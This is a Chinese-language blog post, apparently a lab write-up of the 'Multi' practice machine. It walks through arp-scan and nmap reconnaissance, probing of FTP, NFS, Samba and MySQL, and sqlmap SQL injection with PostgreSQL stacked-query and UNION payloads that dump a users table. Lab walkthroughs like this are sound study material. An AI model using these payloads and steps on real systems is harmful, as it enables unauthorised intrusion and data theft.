<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
    <script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='//gc.zgo.at/count.js'></script>
    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
<meta name="description" content="![image-20250722152006846](https://7r1UMPHK.github.io/image/20250722152007020.webp)

简单复现一下，看样子后面是准备放去HMV的。">
<meta property="og:title" content="内部_Mutli">
<meta property="og:description" content="![image-20250722152006846](https://7r1UMPHK.github.io/image/20250722152007020.webp)

简单复现一下，看样子后面是准备放去HMV的。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Mutli.html">
<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
<title>内部_Mutli</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">内部_Mutli</h1>
<div class="title-right">
    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/177" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/730b4d6af26c2c9b3209ecb8c261122ce3f5a980b1be74f836fa4a7e726b0f0c/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732323135323030373032302e77656270"><img src="https://camo.githubusercontent.com/730b4d6af26c2c9b3209ecb8c261122ce3f5a980b1be74f836fa4a7e726b0f0c/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732323135323030373032302e77656270" alt="image-20250722152006846" data-canonical-src="https://7r1UMPHK.github.io/image/20250722152007020.webp" style="max-width: 100%;"></a></p>
<p>简单复现一下，看样子后面是准备放去HMV的。其中todd--&gt;我是问群主拿了提示，憋不出来了，哈哈哈</p>
<h1>一、信息收集</h1>
<h1>1. 主机发现</h1>
<p>首先，在内网环境中使用 <code class="notranslate">arp-scan</code> 工具扫描本地网络，以发现存活的主机。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.205 08:00:27:b2:39:7d       PCS Systemtechnik GmbH
192.168.205.1   00:50:56:c0:00:08       VMware, Inc. (DUP: 2)</pre></div>
<p>扫描结果显示目标主机的 IP 地址为  <code class="notranslate">192.168.205.205</code>。</p>
<h2>2. 端口与服务扫描</h2>
<p>确定目标 IP 后，使用 <code class="notranslate">nmap</code> 对其进行详细的端口扫描，探测其开放的端口和服务。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.205
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:01 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.205
Host is up (0.00015s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3306/tcp  open  mysql
28080/tcp open  thor-engine
38007/tcp open  unknown
46413/tcp open  unknown
50129/tcp open  unknown
53115/tcp open  unknown
MAC Address: 08:00:27:B2:39:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.07 seconds</pre></div>
<p>这里我还以为我眼花了，我还重新扫了一遍，确实Mutli，哈哈哈</p>
<p>扫描一下具体服务</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p21,22,23,80,111,139,445,2049,3306,28080,38007,46413,50129,53115 -sC -sV 192.168.205.205 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 23:02 EDT
Nmap scan report <span class="pl-k">for</span> 192.168.205.205
Host is up (0.00026s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
<span class="pl-k">|</span>_ssl-date: TLS randomness does not represent <span class="pl-k">time</span>
<span class="pl-k">|</span> ssl-cert: Subject: commonName=ftp-server/organizationName=MyOrganization/stateOrProvinceName=Beijing/countryName=CN
<span class="pl-k">|</span> Not valid before: 2025-07-17T11:34:00
<span class="pl-k">|</span>_Not valid after:  2035-07-15T11:34:00
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
<span class="pl-k">|</span> ssh-hostkey: 
<span class="pl-k">|</span>   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
<span class="pl-k">|</span>   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
<span class="pl-k">|</span>_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
23/tcp    open  telnet      Linux telnetd
80/tcp    open  http        Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Debian<span class="pl-pds">))</span></span>
<span class="pl-k">|</span>_http-title: Apache2 Debian Default Page: It works
<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Debian)
111/tcp   open  rpcbind     2-4 (RPC <span class="pl-c"><span class="pl-c">#</span>100000)</span>
<span class="pl-k">|</span> rpcinfo: 
<span class="pl-k">|</span>   program version    port/proto  service
<span class="pl-k">|</span>   100000  2,3,4        111/tcp   rpcbind
<span class="pl-k">|</span>   100000  2,3,4        111/udp   rpcbind
<span class="pl-k">|</span>   100000  3,4          111/tcp6  rpcbind
<span class="pl-k">|</span>   100000  3,4          111/udp6  rpcbind
<span class="pl-k">|</span>   100003  3           2049/udp   nfs
<span class="pl-k">|</span>   100003  3           2049/udp6  nfs
<span class="pl-k">|</span>   100003  3,4         2049/tcp   nfs
<span class="pl-k">|</span>   100003  3,4         2049/tcp6  nfs
<span class="pl-k">|</span>   100005  1,2,3      35543/tcp6  mountd
<span class="pl-k">|</span>   100005  1,2,3      35639/udp6  mountd
<span class="pl-k">|</span>   100005  1,2,3      53115/tcp   mountd
<span class="pl-k">|</span>   100005  1,2,3      57320/udp   mountd
<span class="pl-k">|</span>   100021  1,3,4      37033/udp6  nlockmgr
<span class="pl-k">|</span>   100021  1,3,4      45001/tcp6  nlockmgr
<span class="pl-k">|</span>   100021  1,3,4      45069/udp   nlockmgr
<span class="pl-k">|</span>   100021  1,3,4      46413/tcp   nlockmgr
<span class="pl-k">|</span>   100227  3           2049/tcp   nfs_acl
<span class="pl-k">|</span>   100227  3           2049/tcp6  nfs_acl
<span class="pl-k">|</span>   100227  3           2049/udp   nfs_acl
<span class="pl-k">|</span>_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
2049/tcp  open  nfs         3-4 (RPC <span class="pl-c"><span class="pl-c">#</span>100003)</span>
3306/tcp  open  mysql       MariaDB 10.3.23 or earlier (unauthorized)
28080/tcp open  http        Werkzeug httpd 3.1.3 (Python 3.9.2)
<span class="pl-k">|</span>_http-server-header: Werkzeug/3.1.3 Python/3.9.2
<span class="pl-k">|</span>_http-title: Admin Panel
38007/tcp open  mountd      1-3 (RPC <span class="pl-c"><span class="pl-c">#</span>100005)</span>
46413/tcp open  nlockmgr    1-4 (RPC <span class="pl-c"><span class="pl-c">#</span>100021)</span>
50129/tcp open  mountd      1-3 (RPC <span class="pl-c"><span class="pl-c">#</span>100005)</span>
53115/tcp open  mountd      1-3 (RPC <span class="pl-c"><span class="pl-c">#</span>100005)</span>
MAC Address: 08:00:27:B2:39:7D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux<span class="pl-k">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
<span class="pl-k">|</span> smb2-time: 
<span class="pl-k">|</span>   date: 2025-07-22T03:02:46
<span class="pl-k">|</span>_  start_date: N/A
<span class="pl-k">|</span>_nbstat: NetBIOS name: MULTI, NetBIOS user: <span class="pl-k">&lt;</span>unknown<span class="pl-k">&gt;</span>, NetBIOS MAC: <span class="pl-k">&lt;</span>unknown<span class="pl-k">&gt;</span> (unknown)
<span class="pl-k">|</span> smb2-security-mode: 
<span class="pl-k">|</span>   3:1:1: 
<span class="pl-k">|</span>_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 20.30 seconds</pre></div>
<ul>
<li><strong>web</strong> 80,28080</li>
<li><strong>共享服务</strong> 2049</li>
<li><strong>samba</strong> 139/445</li>
<li><strong>FTP</strong> 21</li>
<li><strong>数据库</strong> 3306</li>
<li><strong>传统端口</strong> 22,23</li>
</ul>
<h1>二、初始访问</h1>
<h2>ftp</h2>
<p>我比较喜欢先看FTP</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ftp 192.168.205.205
Connected to 192.168.205.205.
220 (vsFTPd 3.0.3)
Name (192.168.205.205:kali): anonymous
530 Permission denied.
ftp: Login failed
ftp<span class="pl-k">&gt;</span> <span class="pl-c1">exit</span>
221 Goodbye.</pre></div>
<p>匿名登录失败</p>
<h2>NFS</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ showmount -e 192.168.205.205
Export list <span class="pl-k">for</span> 192.168.205.205:
/srv/nfs_secure 127.0.0.1</pre></div>
<p>只可以他本地挂载，下一个</p>
<h2><strong>Samba</strong></h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ smbclient -L //192.168.205.205 -N

        Sharename       Type      Comment
        ---------       ----      -------
        secure_share    Disk      
        IPC$            IPC       IPC Service (Secure Samba Server)
Reconnecting with SMB1 <span class="pl-k">for</span> workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.205.205 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                              
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ <span class="pl-c1">cd</span> tmp                                        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ smbclient //192.168.205.205/secure_share -N 
Try <span class="pl-s"><span class="pl-pds">"</span>help<span class="pl-pds">"</span></span> to get a list of possible commands.
smb: <span class="pl-cce">\&gt;</span> ls
  <span class="pl-c1">.</span>                                   D        0  Fri Jul 18 11:22:38 2025
  ..                                  D        0  Thu Jul 17 07:40:23 2025
  bettercap                           N      159  Fri Jul 18 11:22:38 2025

                29801344 blocks of size 1024. 25516556 blocks available
smb: <span class="pl-cce">\&gt;</span> get bettercap 
getting file <span class="pl-cce">\b</span>ettercap of size 159 as bettercap (31.1 KiloBytes/sec) (average 31.1 KiloBytes/sec)
smb: <span class="pl-cce">\&gt;</span> <span class="pl-c1">exit</span>

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat bettercap   
bettercap is a powerful, easily extensible and portable framework written <span class="pl-k">in</span> Go which aims to offer to security researchers, red teamers and reverse engineers</pre></div>
<p>这个算个提示吧，bettercap比较出名的就是二、三层攻击，这是后面的事情了</p>
<h2>mysql</h2>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mysql -h 192.168.205.205 -u root -p
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.128<span class="pl-pds">'</span></span> is not allowed to connect to this MariaDB server
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ mysql -h 192.168.205.205 -u root -p --skip-ssl
Enter password: 
ERROR 1130 (HY000): Host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.128<span class="pl-pds">'</span></span> is not allowed to connect to this MariaDB server</pre></div>
<p>不允许我们连接，不白费力气了</p>
<h2>web</h2>
<p>80的主页是apache2的初始页，尝试爆破目录，没有任何收获</p>
<p>28080有东西</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/06a20a8a1ee7c68d83353b76fa5c3ba98794a457e8310c6d88da233a4cfb4e31/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732323135333931373239372e77656270"><img src="https://camo.githubusercontent.com/06a20a8a1ee7c68d83353b76fa5c3ba98794a457e8310c6d88da233a4cfb4e31/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732323135333931373239372e77656270" alt="image-20250722153917170" data-canonical-src="https://7r1UMPHK.github.io/image/20250722153917297.webp" style="max-width: 100%;"></a></p>
<p>让我们输入用户名，经过尝试，什么名字都可以，没有sql，ssti之类的就单纯使用的user</p>
<p>输入user后会跳转到search</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/98ab21e93f5aa5d4e1ea63bc6ea99168e1a6684e25a2e9473a8941c41431c28e/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732323135343034323739342e77656270"><img src="https://camo.githubusercontent.com/98ab21e93f5aa5d4e1ea63bc6ea99168e1a6684e25a2e9473a8941c41431c28e/68747470733a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303235303732323135343034323739342e77656270" alt="image-20250722154042672" data-canonical-src="https://7r1UMPHK.github.io/image/20250722154042794.webp" style="max-width: 100%;"></a></p>
<p>可以输入一些用户名继续查看，经过测试有sql注入（去burp抓个包，然后sqlmap -r）</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 1               
POST /search HTTP/1.1
Host: 192.168.205.205:28080
User-Agent: Mozilla/5.0 (Windows NT 10.0<span class="pl-k">;</span> Win64<span class="pl-k">;</span> x64<span class="pl-k">;</span> rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml<span class="pl-k">;</span>q=0.9,<span class="pl-k">*</span>/<span class="pl-k">*</span><span class="pl-k">;</span>q=0.8
Accept-Language: zh-CN,zh<span class="pl-k">;</span>q=0.8,zh-TW<span class="pl-k">;</span>q=0.7,zh-HK<span class="pl-k">;</span>q=0.5,en-US<span class="pl-k">;</span>q=0.3,en<span class="pl-k">;</span>q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://192.168.205.205:28080
Connection: keep-alive
Referer: http://192.168.205.205:28080/search
Cookie: session=eyJ1c2VyIjoiYSJ9.aH9ASQ.1M-ZU-QfKjkL88N2Pyia0ZmKDkM
Upgrade-Insecure-Requests: 1
Priority: u=0, i

keyword=1                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlmap -r 1 --batch            
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.6#stable}
<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [(]     <span class="pl-k">|</span> .<span class="pl-s"><span class="pl-pds">'</span>| . |</span>
<span class="pl-s">|___|_  [,]_|_|_|__,|  _|</span>
<span class="pl-s">      |_|V...       |_|   https://sqlmap.org</span>
<span class="pl-s"></span>
<span class="pl-s">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user<span class="pl-pds">'</span></span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="pl-k">for</span> any misuse or damage caused by this program

[<span class="pl-k">*</span>] starting @ 03:44:08 /2025-07-22/

[03:44:08] [INFO] parsing HTTP request from <span class="pl-s"><span class="pl-pds">'</span>1<span class="pl-pds">'</span></span>
[03:44:08] [INFO] testing connection to the target URL
[03:44:08] [INFO] checking <span class="pl-k">if</span> the target is protected by some kind of WAF/IPS
[03:44:08] [INFO] testing <span class="pl-k">if</span> the target URL content is stable
[03:44:08] [INFO] target URL content is stable
[03:44:08] [INFO] testing <span class="pl-k">if</span> POST parameter <span class="pl-s"><span class="pl-pds">'</span>keyword<span class="pl-pds">'</span></span> is dynamic
[03:44:08] [WARNING] POST parameter <span class="pl-s"><span class="pl-pds">'</span>keyword<span class="pl-pds">'</span></span> does not appear to be dynamic
[03:44:08] [WARNING] heuristic (basic) <span class="pl-c1">test</span> shows that POST parameter <span class="pl-s"><span class="pl-pds">'</span>keyword<span class="pl-pds">'</span></span> might not be injectable
[03:44:08] [INFO] testing <span class="pl-k">for</span> SQL injection on POST parameter <span class="pl-s"><span class="pl-pds">'</span>keyword<span class="pl-pds">'</span></span>
[03:44:09] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>AND boolean-based blind - WHERE or HAVING clause<span class="pl-pds">'</span></span>
[03:44:09] [WARNING] reflective value(s) found and filtering out
[03:44:09] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>Boolean-based blind - Parameter replace (original value)<span class="pl-pds">'</span></span>
[03:44:09] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)<span class="pl-pds">'</span></span>
[03:44:09] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>PostgreSQL AND error-based - WHERE or HAVING clause<span class="pl-pds">'</span></span>
[03:44:09] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)<span class="pl-pds">'</span></span>
[03:44:09] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>Oracle AND error-based - WHERE or HAVING clause (XMLType)<span class="pl-pds">'</span></span>
[03:44:09] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>Generic inline queries<span class="pl-pds">'</span></span>
[03:44:09] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>PostgreSQL &gt; 8.1 stacked queries (comment)<span class="pl-pds">'</span></span>
[03:44:19] [INFO] POST parameter <span class="pl-s"><span class="pl-pds">'</span>keyword<span class="pl-pds">'</span></span> appears to be <span class="pl-s"><span class="pl-pds">'</span>PostgreSQL &gt; 8.1 stacked queries (comment)<span class="pl-pds">'</span></span> injectable 
it looks like the back-end DBMS is <span class="pl-s"><span class="pl-pds">'</span>PostgreSQL<span class="pl-pds">'</span></span>. Do you want to skip <span class="pl-c1">test</span> payloads specific <span class="pl-k">for</span> other DBMSes<span class="pl-k">?</span> [Y/n] Y
<span class="pl-k">for</span> the remaining tests, <span class="pl-k">do</span> you want to include all tests <span class="pl-k">for</span> <span class="pl-s"><span class="pl-pds">'</span>PostgreSQL<span class="pl-pds">'</span></span> extending provided level (1) and risk (1) values<span class="pl-k">?</span> [Y/n] Y
[03:44:19] [INFO] testing <span class="pl-s"><span class="pl-pds">'</span>Generic UNION query (NULL) - 1 to 20 columns<span class="pl-pds">'</span></span>
[03:44:19] [INFO] automatically extending ranges <span class="pl-k">for</span> UNION query injection technique tests as there is at least one other (potential) technique found
[03:44:19] [INFO] <span class="pl-s"><span class="pl-pds">'</span>ORDER BY<span class="pl-pds">'</span></span> technique appears to be usable. This should reduce the <span class="pl-k">time</span> needed to find the right number of query columns. Automatically extending the range <span class="pl-k">for</span> current UNION query injection technique <span class="pl-c1">test</span>
[03:44:19] [INFO] target URL appears to have 3 columns <span class="pl-k">in</span> query
[03:44:19] [INFO] POST parameter <span class="pl-s"><span class="pl-pds">'</span>keyword<span class="pl-pds">'</span></span> is <span class="pl-s"><span class="pl-pds">'</span>Generic UNION query (NULL) - 1 to 20 columns<span class="pl-pds">'</span></span> injectable
POST parameter <span class="pl-s"><span class="pl-pds">'</span>keyword<span class="pl-pds">'</span></span> is vulnerable. Do you want to keep testing the others (if any)<span class="pl-k">?</span> [y/N] N
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: keyword (POST)
    Type: stacked queries
    Title: PostgreSQL <span class="pl-k">&gt;</span> 8.1 stacked queries (comment)
    Payload: keyword=1<span class="pl-s"><span class="pl-pds">'</span>;SELECT PG_SLEEP(5)--</span>
<span class="pl-s"></span>
<span class="pl-s">    Type: UNION query</span>
<span class="pl-s">    Title: Generic UNION query (NULL) - 3 columns</span>
<span class="pl-s">    Payload: keyword=1<span class="pl-pds">'</span></span> UNION ALL SELECT NULL,NULL,(CHR(113)<span class="pl-k">||</span>CHR(118)<span class="pl-k">||</span>CHR(106)<span class="pl-k">||</span>CHR(122)<span class="pl-k">||</span>CHR(113))<span class="pl-k">||</span>(CHR(105)<span class="pl-k">||</span>CHR(104)<span class="pl-k">||</span>CHR(84)<span class="pl-k">||</span>CHR(73)<span class="pl-k">||</span>CHR(72)<span class="pl-k">||</span>CHR(107)<span class="pl-k">||</span>CHR(116)<span class="pl-k">||</span>CHR(117)<span class="pl-k">||</span>CHR(111)<span class="pl-k">||</span>CHR(77)<span class="pl-k">||</span>CHR(114)<span class="pl-k">||</span>CHR(111)<span class="pl-k">||</span>CHR(75)<span class="pl-k">||</span>CHR(115)<span class="pl-k">||</span>CHR(109)<span class="pl-k">||</span>CHR(110)<span class="pl-k">||</span>CHR(99)<span class="pl-k">||</span>CHR(99)<span class="pl-k">||</span>CHR(85)<span class="pl-k">||</span>CHR(69)<span class="pl-k">||</span>CHR(84)<span class="pl-k">||</span>CHR(117)<span class="pl-k">||</span>CHR(65)<span class="pl-k">||</span>CHR(113)<span class="pl-k">||</span>CHR(99)<span class="pl-k">||</span>CHR(65)<span class="pl-k">||</span>CHR(68)<span class="pl-k">||</span>CHR(84)<span class="pl-k">||</span>CHR(89)<span class="pl-k">||</span>CHR(80)<span class="pl-k">||</span>CHR(74)<span class="pl-k">||</span>CHR(78)<span class="pl-k">||</span>CHR(98)<span class="pl-k">||</span>CHR(90)<span class="pl-k">||</span>CHR(68)<span class="pl-k">||</span>CHR(102)<span class="pl-k">||</span>CHR(122)<span class="pl-k">||</span>CHR(74)<span class="pl-k">||</span>CHR(108)<span class="pl-k">||</span>CHR(88))<span class="pl-k">||</span>(CHR(113)<span class="pl-k">||</span>CHR(120)<span class="pl-k">||</span>CHR(98)<span class="pl-k">||</span>CHR(107)<span class="pl-k">||</span>CHR(113))-- ciUr
---
[03:44:19] [INFO] the back-end DBMS is PostgreSQL
back-end DBMS: PostgreSQL
[03:44:19] [INFO] fetched data logged to text files under <span class="pl-s"><span class="pl-pds">'</span>/home/kali/.local/share/sqlmap/output/192.168.205.205<span class="pl-pds">'</span></span>

[<span class="pl-k">*</span>] ending @ 03:44:19 /2025-07-22/

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sqlmap -r 1 --batch -D public -T users --dump                             
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.6#stable}
<span class="pl-k">|</span>_ -<span class="pl-k">|</span> <span class="pl-c1">.</span> [<span class="pl-s"><span class="pl-pds">'</span>]     | .<span class="pl-pds">'</span></span><span class="pl-k">|</span> <span class="pl-c1">.</span> <span class="pl-k">|</span>
<span class="pl-k">|</span>___<span class="pl-k">|</span>_  [)]_<span class="pl-k">|</span>_<span class="pl-k">|</span>_<span class="pl-k">|</span>__,<span class="pl-k">|</span>  _<span class="pl-k">|</span>
      <span class="pl-k">|</span>_<span class="pl-k">|</span>V...       <span class="pl-k">|</span>_<span class="pl-k">|</span>   https://sqlmap.org

[<span class="pl-k">!</span>] legal disclaimer: Usage of sqlmap <span class="pl-k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="pl-s"><span class="pl-pds">'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
<span class="pl-s"></span>
<span class="pl-s">[*] starting @ 03:44:40 /2025-07-22/</span>
<span class="pl-s"></span>
<span class="pl-s">[03:44:40] [INFO] parsing HTTP request from <span class="pl-pds">'</span></span>1<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[03:44:40] [INFO] resuming back-end DBMS <span class="pl-pds">'</span></span>postgresql<span class="pl-s"><span class="pl-pds">'</span> </span>
<span class="pl-s">[03:44:40] [INFO] testing connection to the target URL</span>
<span class="pl-s">sqlmap resumed the following injection point(s) from stored session:</span>
<span class="pl-s">---</span>
<span class="pl-s">Parameter: keyword (POST)</span>
<span class="pl-s">    Type: stacked queries</span>
<span class="pl-s">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)</span>
<span class="pl-s">    Payload: keyword=1<span class="pl-pds">'</span></span><span class="pl-k">;</span>SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: keyword<span class="pl-k">=</span>1<span class="pl-s"><span class="pl-pds">'</span> UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(118)||CHR(106)||CHR(122)||CHR(113))||(CHR(105)||CHR(104)||CHR(84)||CHR(73)||CHR(72)||CHR(107)||CHR(116)||CHR(117)||CHR(111)||CHR(77)||CHR(114)||CHR(111)||CHR(75)||CHR(115)||CHR(109)||CHR(110)||CHR(99)||CHR(99)||CHR(85)||CHR(69)||CHR(84)||CHR(117)||CHR(65)||CHR(113)||CHR(99)||CHR(65)||CHR(68)||CHR(84)||CHR(89)||CHR(80)||CHR(74)||CHR(78)||CHR(98)||CHR(90)||CHR(68)||CHR(102)||CHR(122)||CHR(74)||CHR(108)||CHR(88))||(CHR(113)||CHR(120)||CHR(98)||CHR(107)||CHR(113))-- ciUr</span>
<span class="pl-s">---</span>
<span class="pl-s">[03:44:40] [INFO] the back-end DBMS is PostgreSQL</span>
<span class="pl-s">back-end DBMS: PostgreSQL</span>
<span class="pl-s">[03:44:40] [INFO] fetching columns for table <span class="pl-pds">'</span></span>users<span class="pl-s"><span class="pl-pds">'</span> in database <span class="pl-pds">'</span></span>public<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">[03:44:40] [WARNING] reflective value(s) found and filtering out</span>
<span class="pl-s">[03:44:40] [INFO] fetching entries for table <span class="pl-pds">'</span></span>users<span class="pl-s"><span class="pl-pds">'</span> in database <span class="pl-pds">'</span></span>public<span class="pl-s"><span class="pl-pds">'</span></span>
<span class="pl-s">Database: public</span>
<span class="pl-s">Table: users</span>
<span class="pl-s">[4 entries]</span>
<span class="pl-s">+----+-----------------+----------+</span>
<span class="pl-s">| id | email           | username |</span>
<span class="pl-s">+----+-----------------+----------+</span>
<span class="pl-s">| 1  | admin@multi.hmv | admin    |</span>
<span class="pl-s">| 2  | guest@multi.hmv | guest    |</span>
<span class="pl-s">| 3  | test@multi.hmv  | test     |</span>
<span class="pl-s">| 4  | xiao@multi.hmv  | xiao     |</span>
<span class="pl-s">+----+-----------------+----------+</span>
<span class="pl-s"></span>
<span class="pl-s">[03:44:40] [INFO] table <span class="pl-pds">'</span></span>public.users<span class="pl-s"><span class="pl-pds">'</span> dumped to CSV file <span class="pl-pds">'</span></span>/home/kali/.local/share/sqlmap/output/192.168.205.205/dump/public/users.csv<span class="pl-s"><span class="pl-pds">'</span></span>
